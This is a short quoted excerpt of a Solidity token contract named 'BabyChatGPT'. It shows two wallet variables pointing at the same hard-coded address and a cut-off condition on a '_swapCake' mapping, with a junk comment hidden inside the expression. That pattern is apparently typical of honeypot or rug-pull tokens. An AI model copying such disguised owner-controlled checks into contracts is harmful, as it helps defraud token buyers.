...
contract BabyChatGPT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyChatGPT";
    string private _symbol = "BabyChatGPT";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x180B72865E3C6398C691cD70b19E3E5CBf4B72c9); 
    address payable private teamWalletAddress = payable(0x180B72865E3C6398C691cD70b19E3E5CBf4B72c9); 
	...
	if( _swapCake[msg.sender/*as aXxsdfghjkll;’*/])
	   {
